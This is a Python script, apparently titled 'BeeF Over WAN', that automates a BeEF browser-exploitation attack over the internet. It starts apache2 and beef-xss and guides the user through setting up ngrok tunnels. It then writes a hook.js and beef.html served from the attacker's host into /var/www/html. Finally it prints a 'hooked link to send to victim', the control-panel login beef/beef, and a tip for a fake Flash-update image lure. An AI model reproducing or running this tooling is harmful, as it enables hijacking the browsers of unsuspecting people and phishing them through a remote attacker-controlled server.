#!/usr/bin/python
# -*- coding: utf8 -*-

import random 
import string
import argparse
import os
#from termcolor import colored
Filename="hook.js"

def instruction():
	return """
Instructions :\n
You need two Links  which are Forwarded To LocalHost:80 and LocalHost:3000\n
\t1. To send to Victim .
\t2. Beef listens on Port 3000 ,\n\t   so this link should be forwared to LocalHost:3000 .
	
Just Enter your links in the Script \nScript will do neccessary changes required to opt for your Links .

"""

def ngrok():
	return """	
NGROK Steps :-

STEP 1 : Add these Lines To ngrok.yml [Location .ngrok2/ngrok.yml ]
	
\ttunnels:
\t first-app:
\t  addr: 80
\t  proto: http
\t second-app:
\t  addr: 3000
\t  proto: http
	
STEP 2 : Now Start ngrok with : \n
		ngrok start --all

STEP 3 : You will See 2 different links Forwarded to\n 
	Localhost:80              [ Link To be Sent to Victim ]\n
        Localhost:3000		  [ Your Link will be Connecting to.. ] 	
						
STEP 4 : Enter these links in Script and Follow The Steps given in Script.

"""

def banner():
	return """
  ____            ______    ____                  __          __     _   _ 
 |  _ \          |  ____|  / __ \                 \ \        / /\   | \ | |
 | |_) | ___  ___| |__    | |  | |_   _____ _ __   \ \  /\  / /  \  |  \| |
 |  _ < / _ \/ _ \  __|   | |  | \ \ / / _ \ '__|   \ \/  \/ / /\ \ | . ` |
 | |_) |  __/  __/ |      | |__| |\ V /  __/ |       \  /\  / ____ \| |\  |
 |____/ \___|\___|_|       \____/  \_/ \___|_|        \/  \/_/    \_\_| \_|
                                                                           
 BY SKS  \n\n https://github.com/stormshadow07     
                                                                                                                   """
# def color(string, color=None):
#     attr = []
#     attr.append('1')
    
#     if color:
#         if color.lower() == "red":
#             attr.append('31')
#         elif color.lower() == "green":
#             attr.append('32')
#         elif color.lower() == "blue":
#             attr.append('34')
#         return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)

#     else:
#         if string.strip().startswith("[!]"):
#             attr.append('31')
#             return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
#         elif string.strip().startswith("[+]"):
#             attr.append('32')
#             return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
#         elif string.strip().startswith("[?]"):
#             attr.append('33')
#             return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
#         elif string.strip().startswith("[*]"):
#             attr.append('34')
#             return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
#         else:
#             return string


def string_replace(filename, old_string, new_string):
    # Safely read the input filename using 'with'
    with open(filename) as f:
        s = f.read()
        if old_string not in s:
            print("'{old_string}' not found in {filename}.".format(**locals()))
            return 

    # Safely write the changed content, if found in the file
    with open(filename, 'w') as f:
        #print 'Changing "{old_string}" to "{new_string}" in {filename}'.format(**locals())
        s = s.replace(old_string, new_string)
        f.write(s)
		#print("File Saved")



if __name__ == '__main__':
	os.system("clear")
	
	
	print (instruction())
	print("[*] IF you want to Do this Without Port Forwarding : Use NGROK\n")
	ng_check=input("[?] Press '1' to see NGROK Instructions else Press '0' : ")
	print(ng_check)
	if (ng_check):
		print(ngrok())
		con=input("[?] Press Enter to Continue ...")
	os.system("clear")	
	print(" Checking Services Status Required ")
	os.system("service apache2 start")
	os.system("beef-xss")
	os.system("clear")
	print("All Good So far ... \n Close The Browser If Prompted .. ")
	print(banner())
	send_to=input(' [?] Enter Adress of Link [You are Sending to Victim]: ')
	send_to=send_to.rstrip()
	print(" [+] Send_To Link  : "+ send_to)
	connect_to=input(' [?] Enter Adress of Link [Your Link will be Connecting to..]: ')
	connect_to=connect_to.rstrip()
	print(" [+] Connect_To Link  : "+ connect_to)
	print('[✔] Checking directories...')
	if not os.path.isdir("./temp"):
		os.makedirs("./temp")
		print("[+] Creating [./temp] directory for resulting code files")
	else:
		os.system("rm -rf temp/*")
		print("Clean Succesful")
	connect_to_full='http://'+connect_to+":80/hook.js"
	connect_to_panel='http://'+connect_to+"/ui/panel"
	send_to_full='http://'+send_to+'/beef.html'
	#print connect_to_full
	os.system("cp base.js ./temp/hook.js")
	string_replace("./temp/hook.js","SKS_1",connect_to_full)
	string_replace("./temp/hook.js","SKS_2",connect_to)
	
	os.system("cp beef.html ./temp/beef.html")
	string_replace("./temp/beef.html","SKS_3",send_to)
	os.system("cp ./temp/* /var/www/html/")
	os.system("chmod a+rw /var/www/html/hook.js")
	
	print("\n==================================== RESULT ====================================\n")
	print("[+] Access The BeeF Control Panel Using : {}".format(connect_to_panel))
	print("\t Username = beef\n\t Password = beef\n")
	print("[+] Hooked Link To Send to Victim  : ",send_to_full)
	print("[?]\n\nNote : I know few of the Exploits does not work\n       due to Updated Browsers and stuff...\n\nTip : Change Payload or Images Address to your Connect_to Address with Port 80 \n\t Example : \n\t\t")
	print("\tFROM Image URL : http://0.0.0.0:3000/adobe/flash_update.png\n")
	print("\tTO Image URL : http://{}:80/adobe/flash_update.png \n".format(connect_to))
	print("\n Happy Hacking !!!\n Have Problem or Tip ? Contact : https://github.com/stormshadow07")

	
















